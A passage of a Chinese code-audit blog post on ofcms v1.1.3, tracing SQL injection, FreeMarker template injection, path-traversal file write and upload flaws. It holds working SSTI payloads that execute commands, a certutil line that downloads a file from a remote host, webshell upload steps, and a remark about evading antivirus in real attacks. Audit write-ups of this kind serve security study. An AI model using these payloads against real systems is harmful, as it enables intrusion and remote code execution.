+<p>跟进 <code>getPara()</code> 方法，查看具体返回方式， <code>Ctrl + 鼠标左键</code>，由下图代码可知，程序没有对 <code>sql</code> 参数进行过滤，<code>getPara()</code> 请求后，系统直接将返回请求的参数</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020021029645.png" data-caption="image-20221020021029645"><img src="/../images/Java/ofcms/image-20221020021029645.png" alt="image-20221020021029645"></a></p>
+<p>若不知道漏洞点，进行漏洞点追踪定位代码。比如我们通过审计追踪代码，发现<code>/system/generate</code> 路径下 <code>sql</code> 参数没有进行过滤，可能存在注入漏洞</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020020851984.png" data-caption="image-20221020020851984"><img src="/../images/Java/ofcms/image-20221020020851984.png" alt="image-20221020020851984"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020021928106.png" data-caption="image-20221020021928106"><img src="/../images/Java/ofcms/image-20221020021928106.png" alt="image-20221020021928106"></a></p>
+<p>根据现有信息，我们知道，漏洞点参数为 <code>sql</code>，路径为 <code>/system/generate/</code>，向上追踪路径为 <code>/admin/system/generate</code>，综合所得，通过 Burp 代理抓包，点击功能点，查看哪个页面为 <code>/admin/system/generate</code> 且存在输入点参数 <code>sql</code>，则进行测试即可</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020022215661.png" data-caption="image-20221020022215661"><img src="/../images/Java/ofcms/image-20221020022215661.png" alt="image-20221020022215661"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020022414193.png" data-caption="image-20221020022414193"><img src="/../images/Java/ofcms/image-20221020022414193.png" alt="image-20221020022414193"></a></p>
+<h4 id="SSTI服务器模板注入"><a href="#SSTI服务器模板注入" class="headerlink" title="SSTI服务器模板注入"></a>SSTI服务器模板注入</h4><p>由 pom.xml 中发现存在 FreeMarker 模板引擎的依赖，该模板存在模板注入,尝试进行复现</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021000447406.png" data-caption="image-20221021000447406"><img src="/../images/Java/ofcms/image-20221021000447406.png" alt="image-20221021000447406"></a></p>
+<p>漏洞点为模板文件处</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021002005057.png" data-caption="image-20221021002005057"><img src="/../images/Java/ofcms/image-20221021002005057.png" alt="image-20221021002005057"></a></p>
+<p>我们可以修改模板文件内容插入恶意语句，触发系统命令执行。如下插入恶意语句执行系统命令促使弹出计算器</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;calc&quot;) &#125;</span><br></pre></td></tr></table></figure></div>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021003322351.png" data-caption="image-20221021003322351"><img src="/../images/Java/ofcms/image-20221021003322351.png" alt="image-20221021003322351"></a></p>
+<p>保存后，访问主页触发命令，因为编辑的模板为主页样式模板</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021002215557.png" data-caption="image-20221021002215557"><img src="/../images/Java/ofcms/image-20221021002215557.png" alt="image-20221021002215557"></a></p>
+<p>通过 Burp 定位到漏洞代码，<code>/ofcms_admin_war/admin/cms/template</code> 路径下的 <code>file_content</code> 参数</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021002555604.png" data-caption="image-20221021002555604"><img src="/../images/Java/ofcms/image-20221021002555604.png" alt="image-20221021002555604"></a></p>
+<p>对应控制处理方法为 <code>com.ofsoft.cms.admin.controller.cms.TemplateController 类中的save方法</code>，从下图可以看出来，其实代码有对 <code>fileContent</code> 内容进行替换，但没有进行过滤，replace() 的使用方法为 <code>字符串.replace(String oldChar, String newChar)</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021002943097.png" data-caption="image-20221021002943097"><img src="/../images/Java/ofcms/image-20221021002943097.png" alt="image-20221021002943097"></a></p>
+<p>我们跟进 <code>getRequest()</code>方法 <code>Ctrl + 鼠标左键</code>，查看具体返回,由下图可知，直接对返回 <code>request</code> 请求，没有任何过滤</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021005342147.png" data-caption="image-20221021005342147"><img src="/../images/Java/ofcms/image-20221021005342147.png" alt="image-20221021005342147"></a></p>
+<p>漏洞原因为：<code>FreeMarker</code> 提供高级内置函数，导致攻击者可以构造语句去实现攻击，其中引擎模板中存在能够执行的类是主要能构造命令执行的原因，官方文档 <code>http://freemarker.foofun.cn/ref_builtins_expert.html</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021012934815.png" data-caption="image-20221021012934815"><img src="/../images/Java/ofcms/image-20221021012934815.png" alt="image-20221021012934815"></a></p>
+<p>由于我这里找不到具体的代码，所以就不显示了。贴出网上的payload如下</p>
+<p>构造方法一：<br><code>freemarker.template.utility</code> 中的 <code>Execute 类</code> ,利用new函数新建一个Execute类,传输我们要执行的命令作为参数，构造远程命令。 </p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;calc.exe&quot;)&#125;</span><br></pre></td></tr></table></figure></div>
+<br/>
+
+<p>构造方法二：<br><code>freemarker.template.utility</code> 中的 <code>ObjectConstructor类</code></p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;calc.exe&quot;).start()&#125;</span><br></pre></td></tr></table></figure></div>
+<br/>
+
+<p>构造方法三：<br><code>freemarker.template.utility</code> 中的 <code>JythonRuntime类</code></p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;calc.exe&quot;)&lt;/@value&gt;</span><br></pre></td></tr></table></figure></div>
+<br/>
+
+
+<p>具体语句解析，原始：<code>&lt;#assign word_wrapp = &quot;com.acmee.freemarker.WordWrapperDirective&quot;?new()&gt;</code>，利用 <code>Execute</code> 类构造恶意语句 <code>&lt;#assign xxx= &quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;xxx(&quot;calc&quot;)&#125;</code>，其中xxx为相同的字符，亲测数字不能触发语句，<code>freemarker.template.utility.Execute</code> 为 freemarker 模板引擎的</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021014155077.png" data-caption="image-20221021014155077"><img src="/../images/Java/ofcms/image-20221021014155077.png" alt="image-20221021014155077"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021014135817.png" data-caption="image-20221021014135817"><img src="/../images/Java/ofcms/image-20221021014135817.png" alt="image-20221021014135817"></a></p>
+<p>尝试利用 <code>certutil.exe</code> 远程下载文件，远程服务器文件内容只是123456，但由于使用了 <code>certutil</code> 命令，系统会拦截</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; </span><br><span class="line">  $&#123; ex(&quot;certutil -urlcache -split -f http://x.x.x.x:2333/ssti.txt ssti.exe&quot;) &#125;</span><br></pre></td></tr></table></figure></div>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021012311523.png" data-caption="image-20221021012311523"><img src="/../images/Java/ofcms/image-20221021012311523.png" alt="image-20221021012311523"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021012141523.png" data-caption="image-20221021012141523"><img src="/../images/Java/ofcms/image-20221021012141523.png" alt="image-20221021012141523"></a></p>
+<p>把防护关了以后，会下载到 tomcat 的目录下。所以实战中得考虑，绕过主机防护设备，马儿得免杀</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021012506146.png" data-caption="image-20221021012506146"><img src="/../images/Java/ofcms/image-20221021012506146.png" alt="image-20221021012506146"></a></p>
+<h4 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h4><p>漏洞点同样在 <code>SSTI</code> 漏洞位置中的 <code>save</code> 函数中</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021020833483.png" data-caption="image-20221021020833483"><img src="/../images/Java/ofcms/image-20221021020833483.png" alt="image-20221021020833483"></a></p>
+<p>首先从前台获取 <code>file_name、file_content</code> 两个参数，该函数的 <code>file_name</code> 是直接和 <code>pathfile</code> 目录拼接，导致可以路径穿越，文件可以写到任意位置</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021021122226.png" data-caption="image-20221021021122226"><img src="/../images/Java/ofcms/image-20221021021122226.png" alt="image-20221021021122226"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021021309015.png" data-caption="image-20221021021309015"><img src="/../images/Java/ofcms/image-20221021021309015.png" alt="image-20221021021309015"></a></p>
+<p>获取接口</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021022029123.png" data-caption="image-20221021022029123"><img src="/../images/Java/ofcms/image-20221021022029123.png" alt="image-20221021022029123"></a></p>
+<p>构造查询</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021022429063.png" data-caption="image-20221021022429063"><img src="/../images/Java/ofcms/image-20221021022429063.png" alt="image-20221021022429063"></a></p>
+<p>上传 <code>Webshell</code> 至 <code>static</code> 目录</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021033127359.png" data-caption="image-20221021033127359"><img src="/../images/Java/ofcms/image-20221021033127359.png" alt="image-20221021033127359"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021033310849.png" data-caption="image-20221021033310849"><img src="/../images/Java/ofcms/image-20221021033310849.png" alt="image-20221021033310849"></a></p>
+<h4 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h4><p>在 <code>ComnController.java</code> 和 <code>UeditorAction.java</code> 文件下存在多个上传接口，其中 <code>upload</code>、<code>editUploadImage</code>、<code>uploadImage</code>、<code>uploadFile</code>、<code>uploadVideo</code> 和 <code>uploadScrawl</code> 函数均使用了，这里环境接口有问题，导致无法上传图片，所以就无法复现</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021034750952.png" data-caption="image-20221021034750952"><img src="/../images/Java/ofcms/image-20221021034750952.png" alt="image-20221021034750952"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021034529451.png" data-caption="image-20221021034529451"><img src="/../images/Java/ofcms/image-20221021034529451.png" alt="image-20221021034529451"></a></p>
+<p>跟进后没有发现过滤，由于参考文章中能跟进到 <code>MultipartRequest</code> 函数中去，这里由于笔者水平有限，加上环境也许有点问题，导致无法跟进到最后，后续有机会再学习一下</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021040448644.png" data-caption="image-20221021040448644"><img src="/../images/Java/ofcms/image-20221021040448644.png" alt="image-20221021040448644"></a></p>
+<h2 id="四、参考文章"><a href="#四、参考文章" class="headerlink" title="四、参考文章"></a>四、参考文章</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://forum.butian.net/share/1229</span><br><span class="line">https://blog.csdn.net/Alexz__/article/details/116229266</span><br><span class="line">https://www.secpulse.com/archives/185233.html</span><br><span class="line">https://blog.csdn.net/YouthBelief/article/details/122978328</span><br><span class="line">https://www.cnblogs.com/Eleven-Liu/p/12747908.html</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">一、前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">二、环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.</span> <span class="toc-text">三、代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">3.1.</span> <span class="toc-text">1、源码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.2.</span> <span class="toc-text">2、漏洞审计</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.1.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSTI%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.2.</span> <span class="toc-text">SSTI服务器模板注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-number">3.2.3.</span> <span class="toc-text">任意文件写入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.2.4.</span> <span class="toc-text">任意文件上传</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">4.</span> <span class="toc-text">四、参考文章</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/&text=Java代码审计(四)-ofcms v1.1.3"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/&title=Java代码审计(四)-ofcms v1.1.3"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/&is_video=false&description=Java代码审计(四)-ofcms v1.1.3"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java代码审计(四)-ofcms v1.1.3&body=Check out this article: http://example.com/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/&title=Java代码审计(四)-ofcms v1.1.3"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/&title=Java代码审计(四)-ofcms v1.1.3"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/&title=Java代码审计(四)-ofcms v1.1.3"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/&title=Java代码审计(四)-ofcms v1.1.3"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/&name=Java代码审计(四)-ofcms v1.1.3&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/10/21/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%9B%9B)-ofcms-v1-1-3/&t=Java代码审计(四)-ofcms v1.1.3"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2022-2025
+        Funsiooo
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">首页</a></li><!--
+        --><!--
+          --><li><a href="/archives/">归档</a></li><!--
+        --><!--
+          --><li><a href="/search/">搜索</a></li><!--
+        --><!--
+          --><li><a href="/tags/">标签</a></li><!--
+        --><!--
+          --><li><a href="/about/">关于</a></li><!--
+        -->
+          </ul>
+        </nav>        
+      </div>
+
+      <div class="footer-midle">
+        <nav>
+          <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+              <span id="busuanzi_container_page_pv">
+			  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+	      </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?47a5bc2b41144f91553c5eefd4999c0d";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'boom';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+<!-- FancyBox -->
+
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+
+
+</body>
+</html>
